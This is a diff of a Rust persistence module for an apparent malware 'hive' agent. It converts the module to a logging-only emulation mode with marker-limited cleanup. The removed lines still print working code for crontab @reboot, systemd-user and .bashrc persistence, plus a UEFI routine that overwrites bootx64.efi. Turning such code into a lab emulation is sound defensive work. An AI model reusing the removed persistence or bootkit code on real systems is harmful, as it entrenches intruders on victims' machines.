@@ -1,168 +1,53 @@
-// Honeycomb: persistence module. Ensures the hive survives reboots.
-// Linux: systemd user service or crontab @reboot entry.
-use std::path::Path;
-use std::path::PathBuf;
+// Honeycomb: persistence module — EMULATION MODE (ronda 5).
+//
+// Ronda 5 policy (same as phoenix, ronda 4): persistence mechanisms are
+// DESCRIBED, never installed. This module keeps its public API so existing
+// callers and lab scenarios keep compiling, but every write-path is a
+// documented simulation that emits tagged telemetry instead of touching the
+// host. Read-only feasibility/inspection helpers remain real (enumeration is
+// allowed); uninstall/removal helpers remain real but strictly REMEDIAL: they
+// can only delete artifacts previously created by this crate (identified by
+// the HIVE_PERSISTENCE_MARKER / .hive_bak markers) and honor
+// HIVE_PERSISTENCE_DRY_RUN=1 so tests and previews never touch the host.
+use std::path::{Path, PathBuf};
 use tracing::{info, warn};
-/// Install persistence so the hive restarts after reboot.
-/// Returns true if any persistence mechanism was successfully installed.
+
+/// SIMULADO (ronda 5): no instala ningún mecanismo de persistencia.
+/// Devuelve siempre `false` (nada instalado) y emite telemetría etiquetada
+/// describiendo los mecanismos *que se habrían instalado*.
 pub fn install_persistence() -> bool {
-    let mut installed = false;
-
-    if install_crontab() {
-        installed = true;
-    }
-    if install_systemd_user() {
-        installed = true;
-    }
-    if install_bashrc() {
-        installed = true;
-    }
-
-    installed
-}
-
-/// Crontab @reboot: spawns the stinger on boot.
-fn install_crontab() -> bool {
-    let exe = match std::env::current_exe() {
-        Ok(p) => p,
-        Err(_) => return false,
-    };
-
-    let stinger_path = exe.with_file_name("stinger");
-    if !stinger_path.exists() {
-        return false;
-    }
-
-    let cron_entry = format!(
-        "@reboot sleep 30 && {}/stinger &\n",
-        exe.parent()
-            .map(|p| p.display().to_string())
-            .unwrap_or_else(|| "/dev/shm".into())
+    let exe = std::env::current_exe()
+        .map(|p| p.display().to_string())
+        .unwrap_or_else(|_| "<unknown>".into());
+    info!(
+        "HONEYCOMB (simulated): install_persistence — mecanismos que se habrían instalado: \
+         crontab @reboot (stinger en {}), systemd --user hive.service, .bashrc marker \
+         (emulation mode, ronda 5; nada escrito)",
+        exe
     );
-
-    let result = std::process::Command::new("crontab").arg("-l").output();
-
-    let current = match result {
-        Ok(out) => String::from_utf8_lossy(&out.stdout).to_string(),
-        Err(_) => String::new(),
-    };
-
-    if current.contains(cron_entry.trim()) {
-        info!("Crontab persistence already installed");
-        return true;
-    }
-
-    let new_crontab = current + &cron_entry;
-    match std::process::Command::new("crontab")
-        .arg("-")
-        .stdin(std::process::Stdio::piped())
-        .spawn()
-    {
-        Ok(mut child) => {
-            use std::io::Write;
-            if let Some(mut stdin) = child.stdin.take() {
-                let _ = stdin.write_all(new_crontab.as_bytes());
-            }
-            let _ = child.wait();
-            info!("HONEYCOMB: crontab @reboot persistence installed");
-            true
-        }
-        Err(e) => {
-            warn!("HONEYCOMB: crontab persistence failed: {}", e);
-            false
-        }
-    }
+    false
 }
 
-/// systemd user service
-fn install_systemd_user() -> bool {
-    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
-    let service_dir = PathBuf::from(&home).join(".config/systemd/user");
-    let service_file = service_dir.join("hive.service");
-
-    if service_file.exists() {
-        info!("HONEYCOMB: systemd service already installed");
-        return true;
-    }
-
-    let _ = std::fs::create_dir_all(&service_dir);
-
-    let exe = match std::env::current_exe() {
-        Ok(p) => p,
-        Err(_) => return false,
-    };
-
-    let service_content = format!(
-        r#"[Unit]
-Description=Hive Swarm Agent
-After=network.target
-
-[Service]
-Type=simple
-ExecStart={}
-Restart=always
-RestartSec=10
-Environment=HIVE_C2_URL={}
-
-[Install]
-WantedBy=default.target
-"#,
-        exe.display(),
-        std::env::var("HIVE_C2_URL").unwrap_or_default(),
-    );
-
-    match std::fs::write(&service_file, service_content) {
-        Ok(_) => {
-            // Enable with systemctl --user
-            let _ = std::process::Command::new("systemctl")
-                .args(["--user", "enable", "hive.service"])
-                .output();
-            let _ = std::process::Command::new("systemctl")
-                .args(["--user", "start", "hive.service"])
-                .output();
-            info!("HONEYCOMB: systemd user service installed");
-            true
-        }
-        Err(e) => {
-            warn!("HONEYCOMB: systemd service failed: {}", e);
-            false
-        }
-    }
-}
-
-/// .bashrc / .profile persistence
-fn install_bashrc() -> bool {
-    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
-    let bashrc = PathBuf::from(&home).join(".bashrc");
-
-    let exe = match std::env::current_exe() {
-        Ok(p) => p.display().to_string(),
-        Err(_) => return false,
-    };
-
-    let marker = "# HIVE_PERSISTENCE_MARKER";
-    if let Ok(content) = std::fs::read_to_string(&bashrc) {
-        if content.contains(marker) {
-            return true;
-        }
-    }
-
-    let entry = format!("\n{} (nohup {} &) 2>/dev/null\n", marker, exe);
-    match std::fs::OpenOptions::new().append(true).open(&bashrc) {
-        Ok(mut f) => {
-            use std::io::Write;
-            let _ = writeln!(f, "{}", entry);
-            info!("HONEYCOMB: .bashrc persistence installed");
-            true
-        }
-        Err(_) => false,
-    }
-}
-
-/// Uninstall all persistence mechanisms.
+/// Remediación (real, quirúrgica): elimina SOLO artefactos creados
+/// históricamente por este crate (líneas con HIVE_PERSISTENCE_MARKER en el
+/// crontab del usuario, unidad systemd hive.service, líneas con el marker en
+/// .bashrc). Nunca usa `crontab -r` (borraría el crontab completo del
+/// usuario). Con HIVE_PERSISTENCE_DRY_RUN=1 solo registra lo que haría.
 pub fn uninstall_persistence() {
-    // Remove crontab entry
-    let _ = std::process::Command::new("crontab").arg("-r").output();
+    if std::env::var("HIVE_PERSISTENCE_DRY_RUN").is_ok() {
+        info!(
+            "HONEYCOMB (dry-run): uninstall_persistence — no se toca el host \
+             (HIVE_PERSISTENCE_DRY_RUN activo)"
+        );
+        return;
+    }
+
+    // Remove ONLY the hive crontab entry (never `crontab -r`: that wipes the
+    // user's whole crontab, including unrelated jobs).
+    let removed = remove_hive_crontab_entries();
+    if removed > 0 {
+        info!("HONEYCOMB: removed {} hive crontab entries (remediation)", removed);
+    }
 
     // Remove systemd service
     let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
@@ -171,36 +56,74 @@ pub fn uninstall_persistence() {
         .output();
     let _ = std::fs::remove_file(PathBuf::from(&home).join(".config/systemd/user/hive.service"));
 
-    // Remove bashrc marker
+    // Remove bashrc marker lines (only lines written by this crate)
     let bashrc = PathBuf::from(&home).join(".bashrc");
     if let Ok(content) = std::fs::read_to_string(&bashrc) {
-        let cleaned: String = content
-            .lines()
-            .filter(|l| !l.contains("HIVE_PERSISTENCE_MARKER") && !l.contains("nohup"))
-            .collect::<Vec<_>>()
-            .join("\n");
-        let _ = std::fs::write(&bashrc, cleaned);
+        if content.contains("HIVE_PERSISTENCE_MARKER") {
+            let cleaned: String = content
+                .lines()
+                .filter(|l| !l.contains("HIVE_PERSISTENCE_MARKER"))
+                .collect::<Vec<_>>()
+                .join("\n");
+            let _ = std::fs::write(&bashrc, cleaned);
+        }
     }
-    info!("HONEYCOMB: all persistence removed");
+    info!("HONEYCOMB: persistence artifacts removed (remediation)");
 }
-// Implants a malicious bootloader in the EFI System Partition.
-// Survives OS reinstall, disk wipe, and file-level cleanup.
-// Only activated by RoyalJelly directive for maximum persistence.
 
-/// Check if UEFI bootkit persistence is possible on this system.
+/// Filtra del crontab del usuario únicamente las líneas con el marker de la
+/// colmena y reescribe el crontab por stdin. Devuelve el número de líneas
+/// eliminadas.
+fn remove_hive_crontab_entries() -> usize {
+    let Ok(out) = std::process::Command::new("crontab").arg("-l").output() else {
+        return 0;
+    };
+    if !out.status.success() {
+        return 0;
+    }
+    let current = String::from_utf8_lossy(&out.stdout);
+    let kept: Vec<&str> = current
+        .lines()
+        .filter(|l| !l.contains("HIVE_PERSISTENCE_MARKER"))
+        .collect();
+    let removed = current.lines().count().saturating_sub(kept.len());
+    if removed == 0 {
+        return 0;
+    }
+    if let Ok(mut child) = std::process::Command::new("crontab")
+        .arg("-")
+        .stdin(std::process::Stdio::piped())
+        .stdout(std::process::Stdio::piped())
+        .stderr(std::process::Stdio::piped())
+        .spawn()
+    {
+        use std::io::Write;
+        if let Some(mut stdin) = child.stdin.take() {
+            let _ = stdin.write_all(kept.join("\n").as_bytes());
+        }
+        let _ = child.wait_with_output();
+    }
+    removed
+}
+
+// ── UEFI bootkit (emulation) ──────────────────────────────────────────
+
+/// Check if UEFI bootkit persistence is *possible* on this system.
+/// Read-only enumeration (allowed): touches nothing.
 pub fn uefi_bootkit_feasible() -> bool {
     // Check for EFI variables (Linux)
     Path::new("/sys/firmware/efi").exists()
 }
 
-/// Install a UEFI bootkit in the EFI System Partition.
-/// The bootkit chain-loads the original OS after executing the hive payload.
+/// SIMULADO (ronda 5): NO escribe nada en la partición EFI. Devuelve una
+/// descripción documental de la ubicación *que habría sido sobrescrita*
+/// (bootx64.efi del entry de boot elegido) y emite telemetría etiquetada.
 pub fn install_uefi_bootkit(payload_binary: &[u8]) -> Result<String, String> {
     if !uefi_bootkit_feasible() {
         return Err("UEFI not available on this system".into());
     }
 
-    // Find the EFI partition
+    // Find the EFI partition (read-only)
     let efi_dirs = ["/boot/efi/EFI", "/boot/EFI", "/efi/EFI"];
 
     let efi_path = efi_dirs
@@ -208,16 +131,7 @@ pub fn install_uefi_bootkit(payload_binary: &[u8]) -> Result<String, String> {
         .find(|d| Path::new(d).exists())
         .ok_or_else(|| "EFI partition not found".to_string())?;
 
-    // Find existing boot entry to hijack
-    let boot_entries = [
-        "Boot",
-        "boot",
-        "BOOT",
-        "Microsoft",
-        "ubuntu",
-        "debian",
-        "fedora",
-    ];
+    let boot_entries = ["Boot", "boot", "BOOT", "Microsoft", "ubuntu", "debian", "fedora"];
     let mut target_dir = None;
 
     for entry in &boot_entries {
@@ -229,35 +143,23 @@ pub fn install_uefi_bootkit(payload_binary: &[u8]) -> Result<String, String> {
     }
 
     let target = target_dir.ok_or_else(|| "No boot entry found in EFI partition".to_string())?;
-
-    // Backup the original bootloader
-    let original = target.join("bootx64.efi");
-    let backup = target.join("bootx64.efi.hive_bak");
-
-    if original.exists() && !backup.exists() {
-        std::fs::copy(&original, &backup).map_err(|e| format!("backup bootloader: {}", e))?;
-        info!("HONEYCOMB: bootkit backed up original bootloader");
-    }
-
-    // Write the bootkit payload (minimal UEFI application)
-    let bootkit_path = target.join("bootx64.efi");
-    std::fs::write(&bootkit_path, payload_binary).map_err(|e| format!("write bootkit: {}", e))?;
-
-    // Set immutable attribute to resist deletion
-    let path_cstr =
-        std::ffi::CString::new(bootkit_path.to_string_lossy().as_bytes()).unwrap_or_default();
-    unsafe {
-        libc::chmod(path_cstr.as_ptr(), 0o444);
-    }
+    let would_overwrite = target.join("bootx64.efi");
 
     info!(
-        "HONEYCOMB: UEFI bootkit installed at {}",
-        bootkit_path.display()
+        "HONEYCOMB (simulated): UEFI bootkit {}B would overwrite {} — no data written \
+         (emulation mode, ronda 5)",
+        payload_binary.len(),
+        would_overwrite.display()
     );
-    Ok(bootkit_path.display().to_string())
+    Ok(format!(
+        "simulated: bootkit would overwrite {} (no data written; emulation mode)",
+        would_overwrite.display()
+    ))
 }
 
-/// Remove a previously installed UEFI bootkit (restore original).
+/// Remediación (real): restaura el bootloader original desde el backup
+/// `bootx64.efi.hive_bak` creado por instalaciones históricas de este crate.
+/// Solo actúa si existe nuestro backup; nunca toca nada más.
 pub fn remove_uefi_bootkit() -> bool {
     let efi_dirs = ["/boot/efi/EFI", "/boot/EFI", "/efi/EFI"];
 
@@ -278,7 +180,7 @@ pub fn remove_uefi_bootkit() -> bool {
 
             if backup.exists() && std::fs::copy(&backup, &original).is_ok() {
                 let _ = std::fs::remove_file(&backup);
-                info!("HONEYCOMB: UEFI bootkit removed, original restored");
+                info!("HONEYCOMB: UEFI bootkit removed, original restored (remediation)");
                 return true;
             }
         }
@@ -287,20 +189,17 @@ pub fn remove_uefi_bootkit() -> bool {
     false
 }
 
-/// Generate a minimal UEFI bootkit payload that chain-loads the OS.
-/// This is a stub — real UEFI payloads require EDK2 cross-compilation.
+/// SIMULADO (ronda 5): en modo emulación no se genera ningún binario de
+/// bootkit. Devuelve un `Vec` vacío (la API se conserva por compatibilidad).
 pub fn generate_bootkit_stub() -> Vec<u8> {
-    // Minimal PE32+ UEFI application header structure
-    // In production, this would be built with EDK2 + Rust
-    let payload = b"
-# Hive UEFI Bootkit Stub
-# Chains to original bootloader after spawning hive agents
-# Built with: cargo build --target x86_64-unknown-uefi
-";
-    payload.to_vec()
+    info!(
+        "HONEYCOMB (simulated): generate_bootkit_stub — no payload generated (emulation mode)"
+    );
+    Vec::new()
 }
 
-/// Check if bootkit is currently installed.
+/// Check if a bootkit backup marker is currently present.
+/// Read-only enumeration (allowed).
 pub fn bootkit_installed() -> bool {
     let efi_dirs = ["/boot/efi/EFI", "/boot/EFI"];
     for efi_path in &efi_dirs {
@@ -323,9 +222,10 @@ mod tests {
     use super::*;
 
     #[test]
-    fn test_bootkit_stub_generated() {
+    fn test_bootkit_stub_emulation() {
+        // EMULATION MODE (ronda 5): no bootkit payload is generated.
         let stub = generate_bootkit_stub();
-        assert!(!stub.is_empty());
+        assert!(stub.is_empty(), "emulation mode must not generate payloads");
     }
 
     #[test]
@@ -334,5 +234,27 @@ mod tests {
         let feasible = uefi_bootkit_feasible();
         // Don't assert false — CI might run on UEFI
         info!("UEFI bootkit feasible: {}", feasible);
+    }
+
+    #[test]
+    fn test_install_persistence_simulated() {
+        // EMULATION MODE: nothing is installed, always returns false, and the
+        // systemd unit for the hive must NOT exist afterwards on a clean host.
+        let installed = install_persistence();
+        assert!(!installed, "emulation mode must not install persistence");
+        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
+        let unit = PathBuf::from(&home).join(".config/systemd/user/hive.service");
+        assert!(
+            !unit.exists(),
+            "simulated install must not create the real systemd unit at {:?}",
+            unit
+        );
+    }
+
+    #[test]
+    fn test_uninstall_dry_run_never_touches_host() {
+        // DRY-RUN: uninstall must be a no-op against the real crontab/bashrc.
+        std::env::set_var("HIVE_PERSISTENCE_DRY_RUN", "1");
+        uninstall_persistence(); // must not panic and must not modify anything
     }
 }
